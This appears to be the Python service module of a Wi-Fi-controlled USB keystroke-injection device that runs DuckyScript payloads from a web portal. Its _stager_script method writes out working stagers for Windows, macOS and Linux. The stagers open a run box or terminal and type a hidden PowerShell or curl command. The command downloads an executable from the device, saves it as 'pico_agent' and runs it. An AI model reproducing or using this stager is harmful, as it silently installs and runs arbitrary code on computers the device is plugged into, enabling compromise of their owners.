import asyncio
import gc
import json
import os
from types import MethodType

from microdot import Microdot
from microdot.microdot import Response

from device_config import CORS_ALLOW_CREDENTIALS, CORS_ALLOWED_ORIGIN
from ducky import (
    DEFAULT_PAYLOAD,
    PAYLOAD_FILE,
    DuckyScriptError,
    analyze_script,
    ensure_payload,
    find_payload,
)
from helpers import maybe_wait_closed, sleep_ms
from keyboard_layouts import (
    DEFAULT_LAYOUT_CODE,
    is_supported_layout,
    layout_option,
    normalize_layout_code,
    split_layout_code,
    supported_layouts,
    supported_platforms,
)
from status_led import STATUS_LED
from web_assets import LOGIN_HTML

from .constants import (
    _AP_CHECK_INTERVAL_MS,
    _KEYBOARD_LAYOUT_FILE,
    _PAYLOAD_BIN,
    _RUN_HISTORY_LIMIT,
    _SESSION_COOKIE,
    _STATIC_DIR,
    _USB_ENUM_TIMEOUT_MS,
    _WDT_TIMEOUT_MS,
    _esc,
    _ticks_ms,
)


class _Service:
    # Attributes set by SetupServer.__init__ — declared here so static checkers
    # (pyright/pylance) can see them when analysing _Service methods.
    _ap = None
    _ap_ip = ''
    _ap_password_in_use = ''
    _kbd = None
    _keyboard_layout = ''
    _payload_seeded = False
    _run_lock = None
    _run_history = []
    _run_sequence = 0
    _server = None
    _sessions = {}
    _session_timestamps = {}
    _wdt = None
    app = Microdot()
    port = 0

    # Methods implemented in SetupServer — declared here as stubs so that
    # _Service methods can call them through self without checker errors.
    def _auth_enabled(self): ...
    def _is_authorized(self, _): ...
    async def _start_ap(self): ...
    async def execute_script(self, _): ...

    # ── Payload helpers ──────────────────────────────────────────────────────

    def _seed_payload(self):
        payload_path, created = ensure_payload(seed=DEFAULT_PAYLOAD)
        if created:
            self._payload_seeded = True
        return payload_path

    def _read_payload(self):
        gc.collect()
        payload_path = self._seed_payload()
        try:
            with open(payload_path) as f:
                return f.read()
        except OSError:
            return DEFAULT_PAYLOAD

    def _write_payload(self, content):
        payload_path = find_payload() or PAYLOAD_FILE
        with open(payload_path, 'w') as f:
            f.write(content)
        self._payload_seeded = False
        return payload_path

    def _ensure_static_dir(self):
        try:
            os.mkdir(_STATIC_DIR)
        except OSError as exc:
            if exc.args[0] != 17:  # EEXIST
                raise

    def _has_binary(self):
        try:
            os.stat(_PAYLOAD_BIN)
            return True
        except OSError:
            return False

    def _stager_script(self, target_os):
        url = 'http://' + self._ap_ip + '/static/payload.bin'
        if target_os == 'windows':
            cmd = (
                'powershell -w hidden -c "iwr '
                + url
                + ' -OutFile $env:TEMP\\pico_agent.exe; & $env:TEMP\\pico_agent.exe"'
            )
            return 'DELAY 500\nGUI r\nDELAY 500\nSTRING ' + cmd + '\nENTER'
        curl_cmd = (
            'curl -s '
            + url
            + ' -o /tmp/pico_agent && chmod +x /tmp/pico_agent && /tmp/pico_agent &'
        )
        if target_os == 'macos':
            return (
                'DELAY 500\nGUI SPACE\nDELAY 400\nSTRING Terminal\nENTER\n'
                'DELAY 600\nSTRING ' + curl_cmd + '\nENTER'
            )
        return 'DELAY 500\nCTRL-ALT t\nDELAY 500\nSTRING ' + curl_cmd + '\nENTER'

    # ── Keyboard layout ──────────────────────────────────────────────────────

    def _load_keyboard_layout(self):
        try:
            with open(_KEYBOARD_LAYOUT_FILE) as f:
                raw = f.read().strip()
        except OSError:
            raw = ''
        normalized = normalize_layout_code(raw or self._keyboard_layout)
        if normalized not in {item['code'] for item in supported_layouts()}:
            normalized = DEFAULT_LAYOUT_CODE
        self._keyboard_layout = normalized
        return self._keyboard_layout

    def _persist_keyboard_layout(self, code):
        with open(_KEYBOARD_LAYOUT_FILE, 'w') as f:
            f.write(code + '\n')

    def _set_keyboard_layout(self, code, *, persist=False):
        normalized = normalize_layout_code(code)
        if not is_supported_layout(normalized):
            raise ValueError('unsupported keyboard layout')
        self._keyboard_layout = normalized
        if persist:
            self._persist_keyboard_layout(normalized)
        return normalized

    def _keyboard_layout_state(self):
        option = layout_option(self._keyboard_layout)
        platform, layout = split_layout_code(self._keyboard_layout)
        target_label = option['platform_label'] + ' · ' + option['label']
        return {
            'keyboard_layout': layout,
            'keyboard_layout_code': layout,
            'keyboard_layout_hint': 'Used for typed text and remembered on the device.',
            'keyboard_layout_label': option['label'],
            'keyboard_layout_platform': option['platform'],
            'keyboard_layout_profile': option['code'],
            'keyboard_layout_profile_code': option['code'],
            'keyboard_layout_short': option['layout'],
            'keyboard_layouts': supported_layouts(platform),
            'keyboard_os': platform,
            'keyboard_os_code': platform,
            'keyboard_os_label': option['platform_label'],
            'keyboard_oses': supported_platforms(),
            'keyboard_target_label': target_label,
        }

    # ── Validation / history ─────────────────────────────────────────────────

    def _validation_state(self, script):
        return analyze_script(script)

    def _history_preview(self, script):
        for raw_line in script.replace('\r\n', '\n').replace('\r', '\n').split('\n'):
            stripped = raw_line.strip()
            upper = stripped.upper()
            if not stripped or upper == 'REM' or upper.startswith('REM ') or upper.startswith('//'):
                continue
            if len(stripped) > 72:
                return stripped[:69] + '...'
            return stripped
        return 'Empty payload'

    def _recent_runs(self):
        return [dict(item) for item in self._run_history]

    def _record_run(self, script, message, notice, *, source):
        self._run_sequence += 1
        self._run_history.insert(
            0,
            {
                'at_ms': _ticks_ms(),
                'message': message,
                'notice': notice,
                'preview': self._history_preview(script),
                'sequence': self._run_sequence,
                'source': source,
            },
        )
        del self._run_history[_RUN_HISTORY_LIMIT:]

    def record_run(self, script, message, notice, *, source):
        self._record_run(script, message, notice, source=source)

    # ── Render helpers ───────────────────────────────────────────────────────

    def _render_login(self, message='', username=''):
        message_class = 'notice--hidden'
        if message:
            message_class = 'notice--error'
        page = LOGIN_HTML.decode()
        page = page.replace('{{message_class}}', message_class)
        page = page.replace('{{message}}', _esc(message))
        page = page.replace('{{username}}', _esc(username))
        return page

    def _keyboard_ready(self):
        return self._kbd is not None and self._kbd.is_open()

    def _bootstrap_state(self):
        from device_config import AP_SSID

        message = ''
        notice = 'quiet'
        if self._payload_seeded:
            message = 'payload.dd was seeded on this boot.'
        payload = self._read_payload()
        state = {
            'ap_ip': self._ap_ip,
            'ap_password': self._ap_password_in_use or 'Open network',
            'ap_ssid': AP_SSID,
            'auth_enabled': self._auth_enabled(),
            'keyboard_ready': self._keyboard_ready(),
            'message': message,
            'notice': notice,
            'payload': payload,
            'run_history': self._recent_runs(),
            'seeded': self._payload_seeded,
            'has_binary': self._has_binary(),
        }
        state.update(self._keyboard_layout_state())
        return state

    # ── Session helpers ──────────────────────────────────────────────────────

    def _clear_session(self, request):
        token = request.cookies.get(_SESSION_COOKIE, '')
        if token:
            self._sessions.pop(token, None)
            self._session_timestamps.pop(token, None)

    def _session_cookie(self, token):
        return f'{_SESSION_COOKIE}={token}; Path=/; HttpOnly; SameSite=Strict'

    def _expired_session_cookie(self):
        return f'{_SESSION_COOKIE}=; Path=/; Max-Age=0; HttpOnly; SameSite=Strict'

    # ── Response helpers ─────────────────────────────────────────────────────

    def _cors_headers(self, request):
        if not CORS_ALLOWED_ORIGIN:
            return {}
        origin = request.headers.get('Origin') or request.headers.get('origin') or ''
        if CORS_ALLOWED_ORIGIN != '*' and origin != CORS_ALLOWED_ORIGIN:
            return {}
        headers = {
            'Access-Control-Allow-Headers': 'Content-Type',
            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
            'Access-Control-Allow-Origin': CORS_ALLOWED_ORIGIN if CORS_ALLOWED_ORIGIN else origin,
        }
        if CORS_ALLOWED_ORIGIN != '*':
            headers['Vary'] = 'Origin'
        if CORS_ALLOW_CREDENTIALS and CORS_ALLOWED_ORIGIN != '*':
            headers['Access-Control-Allow-Credentials'] = 'true'
        return headers

    def _json_response(self, data, status_code=200, extra_headers=None):
        headers = {
            'Content-Type': 'application/json; charset=utf-8',
            'Cache-Control': 'no-store',
            'X-Content-Type-Options': 'nosniff',
        }
        if extra_headers:
            headers.update(extra_headers)
        return Response(json.dumps(data), status_code, headers=headers)

    def _auth_guard(self, request):
        if not self._is_authorized(request):
            return self._json_response({'message': 'Sign in required.'}, 401)
        return None

    # ── TCP serving ──────────────────────────────────────────────────────────

    async def _serve(self, reader, writer):
        if not hasattr(writer, 'awrite'):

            async def _aw(self, data):
                self.write(data)
                await self.drain()

            async def _ac(self):
                self.close()
                try:
                    await self.wait_closed()
                except Exception:
                    pass

            writer.awrite = MethodType(_aw, writer)
            writer.aclose = MethodType(_ac, writer)
        await self.app.handle_request(reader, writer)

    # ── Keyboard / HID ───────────────────────────────────────────────────────

    def _run_lock_obj(self):
        if self._run_lock is None:
            self._run_lock = asyncio.Lock()
        return self._run_lock

    def _keyboard(self):
        if self._kbd is None:
            from hid import HIDKeyboard

            self._kbd = HIDKeyboard()
        return self._kbd

    def keyboard(self):
        return self._keyboard()

    async def _ensure_keyboard(self):
        keyboard = self._keyboard()
        ready = await keyboard.wait_open(_USB_ENUM_TIMEOUT_MS)
        if not ready:
            raise OSError('USB HID did not enumerate within 5 s')
        return keyboard

    # ── Payload execution ────────────────────────────────────────────────────

    async def _run_payload(self, script, *, source='portal'):
        try:
            await self.execute_script(script)
            message, notice = 'Payload executed.', 'success'
        except DuckyScriptError as exc:
            message, notice = f'Error: {exc}', 'error'
        except OSError as exc:
            message, notice = f'USB error: {exc}', 'error'
        self._record_run(script, message, notice, source=source)
        return message, notice

    # ── Server lifecycle ──────────────────────────────────────────────────────

    async def _prepare_server(self):
        if self._server is not None:
            return

        self._load_keyboard_layout()
        self._seed_payload()

        await STATUS_LED.show('setup_ap_starting')
        await self._start_ap()
        await STATUS_LED.show('setup_ap_ready')

        try:
            self._server = await asyncio.start_server(
                self._serve,
                '0.0.0.0',
                self.port,
                backlog=3,
            )
        except OSError as exc:
            raise RuntimeError('setup server bind failed') from exc

        await STATUS_LED.show('setup_server_ready')
        STATUS_LED.on()

    async def start(self):
        await self._prepare_server()
        try:
            import machine

            _WDT = getattr(machine, 'WDT', None)
            self._wdt = _WDT(timeout=_WDT_TIMEOUT_MS) if _WDT is not None else None
        except Exception:
            self._wdt = None
        asyncio.create_task(self._ap_watchdog())

    async def stop(self):
        if self._server is not None:
            self._server.close()
            await maybe_wait_closed(self._server)
            self._server = None
        if self._ap is not None:
            try:
                self._ap.active(False)
            except OSError:
                pass
            self._ap = None
        self._sessions = {}

    async def _restart_tcp_server(self):
        if self._server is not None:
            try:
                self._server.close()
                await maybe_wait_closed(self._server)
            except Exception:
                pass
            self._server = None
        try:
            self._server = await asyncio.start_server(self._serve, '0.0.0.0', self.port, backlog=3)
        except OSError:
            pass

    async def _ensure_ap_active(self):
        if self._ap is None:
            return
        try:
            if self._ap.active():
                return
        except Exception:
            return
        try:
            await self._start_ap()
        except Exception:
            return
        await self._restart_tcp_server()

    async def _ap_watchdog(self):
        while True:
            await sleep_ms(_AP_CHECK_INTERVAL_MS)
            if self._wdt is not None:
                self._wdt.feed()
            try:
                await self._ensure_ap_active()
            except Exception:
                pass
